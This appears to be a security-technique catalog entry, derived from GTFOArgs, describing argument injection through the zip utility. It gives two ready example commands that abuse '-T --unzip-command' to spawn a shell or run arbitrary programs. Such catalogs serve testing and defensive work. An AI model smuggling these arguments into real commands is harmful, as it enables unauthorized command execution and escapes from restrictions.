---
trust_level: community
id: argument-injection-zip
namespace: argument:injection:zip
name: zip
description: Argument injection via zip
version: 1.0.0
capabilities:
- security.execution.command
platforms:
- cross-platform
techniques:
- execution
execution:
  template: zip
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
- description: Can be used to execute arbitrary commands on a system and spawn shells
    either directly or otherwise.
  command: 'zip /tmp/out.zip /etc/hostname -T --unzip-command="sh #" '
- description: Can be used to execute arbitrary commands on a system. Specifics vary
    depending on the version of zip used.
  command: 'zip /tmp/out.zip /etc/hostname -T --unzip-command="uname -a #" '
references:
- label: GTFOArgs
  url: https://gtfoargs.github.io/gtfoargs/zip/
features:
- compression
- file-system
- pipes-stdin
- stealth
---

# zip

GTFOArgs entry for zip. This binary can be used to inject arguments for execution, file operations, or other capabilities.
